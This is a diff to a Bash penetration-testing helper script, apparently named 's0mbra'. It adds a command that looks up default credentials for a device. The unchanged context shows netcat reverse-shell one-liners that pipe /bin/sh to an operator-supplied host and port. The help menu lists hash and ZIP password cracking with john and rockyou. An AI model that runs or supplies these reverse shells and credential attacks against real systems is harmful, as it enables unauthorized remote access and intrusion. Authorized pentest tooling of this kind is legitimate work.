@@ -503,12 +503,20 @@ generate_shells() {
     echo -e "\033[36m[netcat]\033[0m /bin/sh | nc $1 $port"
     echo -e "\033[36m[netcat]\033[0m rm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
     echo -e "\033[36m[netcat]\033[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
-    echo -e "$NEWLINE"
+    echo -e "$BLUE\n[s0mbra] Done! $CLR"
 }
 
 pwn() {
     echo -e "$BLUE[s0mbra] Running automated recon on $1...\n    Puede tomar un poco tiempo, tienes que ser paciente... ;)  $YELLOW"
 }
+
+defcreds() {
+    clear
+    echo -e "$BLUE[s0mbra] Looking for default credentials for $1...$CLR"
+    creds search $1
+    echo -e "$BLUE\n[s0mbra] Done! $CLR"
+}
+
 
 cmd=$1
 clear
@@ -555,6 +563,9 @@ case "$cmd" in
     ;;
     ssh_to_john)
         ssh_to_john "$2"
+    ;;
+    defcreds)
+        defcreds "$2"
     ;;
     um)
         um "$2"
@@ -633,6 +644,7 @@ case "$cmd" in
         echo -e "\t$CYAN rockyou_john $GRAY[TYPE] [HASHES]$CLR\t\t\t -> runs john+rockyou against [HASHES] file with hashes of type [TYPE]"
         echo -e "\t$CYAN ssh_to_john $GRAY[ID_RSA]$CLR\t\t\t\t -> id_rsa to JTR SSH hash file for SSH key password cracking"
         echo -e "\t$CYAN rockyou_zip $GRAY[ZIP file]$CLR\t\t\t\t -> crack ZIP password"
+        echo -e "\t$CYAN defcreds $GRAY[DEVICE/SYSTEM]$CLR\t\t\t\t -> default credentials for DEVICE or SYSTEM"
         echo -e "$BLUE:: SAST ::$CLR"
         echo -e "\t$CYAN um $GRAY[FILE]\t\t\t$YELLOW(JavaScript)$CLR\t -> un-minifies JS file"
         echo -e "\t$CYAN snyktest $GRAY[DIR]\t\t\t$YELLOW(JavaScript)$CLR\t -> runs snyk test on DIR (this should be root of Node app, where package.json exists)"
